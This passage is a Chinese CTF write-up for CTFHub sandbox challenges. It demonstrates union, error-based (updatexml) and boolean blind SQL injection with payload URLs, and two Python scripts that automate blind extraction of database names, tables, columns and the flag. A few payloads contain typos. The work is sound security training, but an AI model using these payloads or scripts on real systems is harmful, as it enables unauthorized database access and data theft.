+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-f7f85c36768fadcc.sandbox.ctfhub.com:10800/?id=-1``&#x27; union select 1,database() --+</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=MDg3Njk1ZGJkMzM2Yjc3YjhkZDFkNTg3ZjQwODA1MGRfQTVzaVB5VW1SMGVpd01VTlo1elMxcUp2NG9STnBPbUZfVG9rZW46WE1BYWJzSDZ4b1BhYTR4VWc0cmNmRzc2blBlXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆表：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-f7f85c36768fadcc.sandbox.ctfhub.com:10800/?id=-1``&#x27; union select 1,group_concat(table_name)from information_schema.tables where table_schema=0x73716c69--+</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGI1YzIzNTE2ODBhN2MxYmQyM2U5ZDZkNzA2OGZlYTlfaU5Rb2pHYWthVWkzUkliaXFmMjZ3YlRqa0NUcUNHdEhfVG9rZW46T05QMWJHMTcyb2N0RG54UGNCM2NGNndwblV3XzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆字段：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-f7f85c36768fadcc.sandbox.ctfhub.com:10800/?id=-1``&#x27; union select 1,froup_concat(column_name)from information_schema.columns where table_name=0x666c6167--+</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDVmYTIwMzA5YjgxODM4ZDUzMjYwNmJlNWE2MmNhZjRfU0xOb1pTeHRxWWVBSWhIakdTT0N3NWtRR2dKQXpxaWpfVG9rZW46V3R0VmJtYk1Gb29XSk14ODVOYWM4a1B1bkZjXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆字段值：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-f7f85c36768fadcc.sandbox.ctfhub.com:10800/?id=-1``&#x27; union select 1,flag from sqli.flag--+</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=MzU5NDIyOWVhMTdhNGY5OTBjYjFkYzgwNjA5YWE2ZDRfaVMwWGp4UWhQODdyYmdyakVESHRuTXJhNE5VOWJVc3hfVG9rZW46WnFjbmI3cjh1b3owZ2x4NmhBVWNqSjU4bldkXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>闭合方式id&#x3D;1，回显查询正确</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=OTQ3ZjE2MWQ2ZTNlYTAzODQxZGIwY2U1MDFiYzQzN2VfQ3VJOGhNVkQ2N3l3eXRNY3FRUXVxaGhUaHNWbW55RG9fVG9rZW46UEQ3emJJN1phb2VPSFJ4OEZ2eWNGVGFnblFtXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>输入1’提示报错，可以采用报错注入</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=MTljNzEzYWM5ZTc2MDhjOGIzZTQ5NjEzYmM4ZTM0ZDlfZ3lmVjV5cEx5aTZNT2ltaThwTjdSSkNpNWRpNGtpMlNfVG9rZW46TzVEQ2JBTVYyb255Uk14aFNoSmM0SEJRbmhoXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>使用updatexml，得到库名</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-e241b88f18dc333d.sandbox.ctfhub.com:10800/?id=1`` and updatexml(1,concat(0x5e,database()),1)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NzllN2JmNGU0ZDQzZWFlOWUyZTg4YWY4YTVlNTZhNzBfQWxvUGVHSzR2d2hCaXBIR0pBOG00b3BpNGVYcGNwMDhfVG9rZW46U2lBamJrM1RWb0ZpVEV4Mk5FMWNVM2dSbk9mXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>得到表名</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-e241b88f18dc333d.sandbox.ctfhub.com:10800/?id=1`` and updatexml(1,concat(0x5e,(select group_concat(table_name)from information_schema.tables where table_schema=0x73716c69),0x5e),1)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=ODAyZDc0NGM4N2MyZjcyZGIyOTNmNzQ2NGIwN2QyNzBfb1cwNVNRd0ZkNWF2T0EyaWRTd0hKaUFmZTh3NnRTb3hfVG9rZW46VXZTTmI0TDh3b1JlMTJ4SXU0YWNVcUNIbkljXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>得到字段</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-e241b88f18dc333d.sandbox.ctfhub.com:10800/?id=1`` and updatexml(1,concat(0x5e,(select group_concat(column_name)from information_schema.columns where table_name=0x666c6167),0x5e),1)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NjUyOWZjZTZmMDc2YTVjMjM0ZmU2NWMyODVhZWM2NTJfc284a3dLM01LaEwxRDFvNlZueU5wYUdmRmhTUGFSU1lfVG9rZW46RXNNQmJsN2hNb2JxZEZ4SmdiSGNiR2FCbjFlXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>得到字段的值flag，但是缺少了一部分</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-e241b88f18dc333d.sandbox.ctfhub.com:10800/?id=1`` and updatexml(1,concat(0x5e,(select flag from sqli.flag),0x5e),1)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTg5ZDJmNzQ5Mjc5NDhlNWRjOTQ4MTNhZWQzYWNjZjZfMDdpc28yellnWTB5NFFBMWRhRzVsUnlHUVc4ZUp3SWtfVG9rZW46QWZ4QmJYYloybzRORkR4dUlkOWN4cTJYbnFnXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>使用mid得到剩下的部分</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-e241b88f18dc333d.sandbox.ctfhub.com:10800/?id=1`` and updatexml(1,concat(0x5e,mid(select flag from sqli.flag),32),0x5e),1</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=ODEzYmVjZGRmY2NiMWU3YWFhMGYwMjg1MWUzODE5MjJfdnRwOHBBdkliWXdnRW9aU3pWUGhhMzh2UWxKYVkyVDVfVG9rZW46SzJwa2JtQ3o1b0dTRTV4RWJHVGNIU291bjlmXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>闭合方式id&#x3D;1</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=MjRmNzU2YjEwMTE1ZjU4NmE2ZDkyZWRhYzNlZjM5ODlfWXpCMFV6WEFCSGpaQjVQbFpxNkx1eGw1cGJDZ21lUnJfVG9rZW46QVRNemJCdUU2b1VadE94emxtemM1VVdMbmhjXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>当数据库查询结果为空或者查询语句报错，回显error，所以通过if（expr1,expr2,expr3）来判断</p>
+<blockquote>
+<p>if（expr1,expr2,expr3）如果expr1的值为true，执行expr2，若为false，执行expr3</p>
+</blockquote>
+<p>那么就可以再expr1处插入判断语句，expr2处放上正确语法的sql语句，expr3处放错误语法的sql语句，如此可以判断1处的判断语句是否正确</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-64dd4ccf83da6564.sandbox.ctfhub.com:10800``/?id=if(substr(database(),1,1)=&quot;s&quot;,1,(select table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>第一个字母为s，回显success</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=Yzc2M2ZiZmIxM2RjN2Q4ZGZjZTQ5OGVjNjM4NTg5ODZfZU92Q3FqbnBCREt0TlVWVXc1WXBza3kwVHFORnJSRTlfVG9rZW46REgwY2JScW5Mb2s4MUh4b2ozQmNXcTVJblViXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>第一个字母a，回显error</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=N2E3ZTIzNzEyM2RiMGM0YzY0OTlkNjQ0MDc0NDM4YzlfRTJxZ0ZZNEhnamZRUmlNTnZuT2UzZk9NeVZUb3M5Q1BfVG9rZW46VnhNMmIwTzFFb0lCbmt4bzJ6RGNiRVRwbmplXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>如此可以判断出库名的第一个字母为s，但这样很慢，使用脚本或者sqlmap</p>
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">urlOPEN = <span class="string">&#x27;http://challenge-64dd4ccf83da6564.sandbox.ctfhub.com:10800&#x27;</span>  <span class="comment"># 换成自己环境的url</span></span><br><span class="line">starOperatorTime = []</span><br><span class="line">mark = <span class="string">&#x27;query_success&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_name</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;sqcwertyuioplkjhgfdazxvbnm&#x27;</span>:</span><br><span class="line">            url = urlOPEN + <span class="string">&#x27;/?id=if(substr(database(),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> % (</span><br><span class="line">            j, i)</span><br><span class="line">            <span class="comment"># print(url+&#x27;%23&#x27;)</span></span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                name = name + i</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;database_name:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_name</span>():</span><br><span class="line">    <span class="built_in">list</span> = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;sqcwertyuioplkjhgfdazxvbnm&#x27;</span>:</span><br><span class="line">                url = urlOPEN + <span class="string">&#x27;/?id=if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> % (</span><br><span class="line">                k, j, i)</span><br><span class="line">                <span class="comment"># print(url+&#x27;%23&#x27;)</span></span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name = name + i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">list</span>.append(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;table_name:&#x27;</span>, <span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_name</span>():</span><br><span class="line">    <span class="built_in">list</span> = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3</span>):  <span class="comment"># 判断表里最多有4个字段</span></span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):  <span class="comment"># 判断一个 字段名最多有9个字符组成</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;sqcwertyuioplkjhgfdazxvbnm&#x27;</span>:</span><br><span class="line">                url = urlOPEN + <span class="string">&#x27;/?id=if(substr((select column_name from information_schema.columns where table_name=&quot;flag&quot;and table_schema= database() limit %d,1),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> % (</span><br><span class="line">                k, j, i)</span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name = name + i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">list</span>.append(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;column_name:&#x27;</span>, <span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):  <span class="comment"># 判断一个值最多有51个字符组成</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">126</span>):</span><br><span class="line">            url = urlOPEN + <span class="string">&#x27;/?id=if(ascii(substr((select flag from flag),%d,1))=%d,1,(select table_name from information_schema.tables))&#x27;</span> % (</span><br><span class="line">            j, i)</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                name = name + <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;value:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    database_name()</span><br><span class="line">    table_name()</span><br><span class="line">    column_name()</span><br><span class="line">    get_data()</span><br><span class="line"><span class="comment">#没用过，不知道快不快</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.util.retry <span class="keyword">import</span> Retry</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标URL和成功标记</span></span><br><span class="line">URL = <span class="string">&#x27;http://challenge-64dd4ccf83da6564.sandbox.ctfhub.com:10800&#x27;</span>  <span class="comment"># 替换为实际URL</span></span><br><span class="line">SUCCESS_MARKER = <span class="string">&#x27;query_success&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建带重试机制的会话</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_retry_session</span>():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    retries = Retry(</span><br><span class="line">        total=<span class="number">3</span>,</span><br><span class="line">        backoff_factor=<span class="number">1</span>,</span><br><span class="line">        status_forcelist=[<span class="number">500</span>, <span class="number">502</span>, <span class="number">503</span>, <span class="number">504</span>]</span><br><span class="line">    )</span><br><span class="line">    session.mount(<span class="string">&#x27;http://&#x27;</span>, HTTPAdapter(max_retries=retries))</span><br><span class="line">    session.mount(<span class="string">&#x27;https://&#x27;</span>, HTTPAdapter(max_retries=retries))</span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通用二分法盲注函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_injection</span>(<span class="params">session, payload, max_len=<span class="number">50</span></span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_len + <span class="number">1</span>):</span><br><span class="line">        low, high = <span class="number">32</span>, <span class="number">126</span></span><br><span class="line">        char = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 二分查找字符ASCII值</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            query = <span class="string">f&#x27;if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;pos&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,(select 1 union select 2))&#x27;</span></span><br><span class="line">            resp = session.get(<span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>/?id=<span class="subst">&#123;query&#125;</span>&quot;</span>, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> SUCCESS_MARKER <span class="keyword">in</span> resp.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 验证最终字符</span></span><br><span class="line">        <span class="keyword">if</span> high &gt;= <span class="number">32</span>:</span><br><span class="line">            query = <span class="string">f&#x27;if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;pos&#125;</span>,1))=<span class="subst">&#123;high&#125;</span>,1,(select 1 union select 2))&#x27;</span></span><br><span class="line">            resp = session.get(<span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>/?id=<span class="subst">&#123;query&#125;</span>&quot;</span>, timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> SUCCESS_MARKER <span class="keyword">in</span> resp.text:</span><br><span class="line">                char = <span class="built_in">chr</span>(high)</span><br><span class="line">                result.append(char)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;\r<span class="subst">&#123;<span class="string">&quot;&quot;</span>.join(result)&#125;</span>&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 没有更多字符</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>()  <span class="comment"># 换行</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result) <span class="keyword">if</span> result <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库信息获取函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 爆破数据库名:&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> blind_injection(session, <span class="string">&quot;database()&quot;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_tables</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[+] 爆破数据表:&quot;</span>)</span><br><span class="line">    tables = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):  <span class="comment"># 最多爆破4个表</span></span><br><span class="line">        table = blind_injection(session,</span><br><span class="line">                                <span class="string">f&quot;(select table_name from information_schema.tables where table_schema=database() limit <span class="subst">&#123;i&#125;</span>,1)&quot;</span>,</span><br><span class="line">                                <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> table:</span><br><span class="line">            tables.append(table)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> tables</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_columns</span>(<span class="params">session, table</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] 爆破表 <span class="subst">&#123;table&#125;</span> 的列:&quot;</span>)</span><br><span class="line">    columns = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):  <span class="comment"># 最多爆破4个列</span></span><br><span class="line">        col = blind_injection(session,</span><br><span class="line">                              <span class="string">f&quot;(select column_name from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27; limit <span class="subst">&#123;i&#125;</span>,1)&quot;</span>,</span><br><span class="line">                              <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> col:</span><br><span class="line">            columns.append(col)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> columns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_data</span>(<span class="params">session, table, column</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] 转储 <span class="subst">&#123;table&#125;</span>.<span class="subst">&#123;column&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> blind_injection(session, <span class="string">f&quot;(select <span class="subst">&#123;column&#125;</span> from <span class="subst">&#123;table&#125;</span>)&quot;</span>, <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">with</span> create_retry_session() <span class="keyword">as</span> s:</span><br><span class="line">        <span class="comment"># 信息收集流程</span></span><br><span class="line">        db = get_database(s)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;数据库名称: <span class="subst">&#123;db&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        tables = get_tables(s)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;发现表: <span class="subst">&#123;tables&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        target_table = <span class="string">&#x27;flag&#x27;</span> <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> tables <span class="keyword">else</span> tables[<span class="number">0</span>]</span><br><span class="line">        cols = get_columns(s, target_table)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;表列信息: <span class="subst">&#123;cols&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        target_col = <span class="string">&#x27;flag&#x27;</span> <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> cols <span class="keyword">else</span> cols[<span class="number">0</span>]</span><br><span class="line">        data = dump_data(s, target_table, target_col)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n最终数据: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NGYwNmRkZWEyODU0YTU5ZDlkMDI4YjY2YzhiOTYxNDRfSkdWOXRueFZlODJUdnBLeGJZM2FVd1BMMnZWMFE5TWZfVG9rZW46VlV6VWJFOTZKbzNvTEx4c1QwWWNYenEwbnRkXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
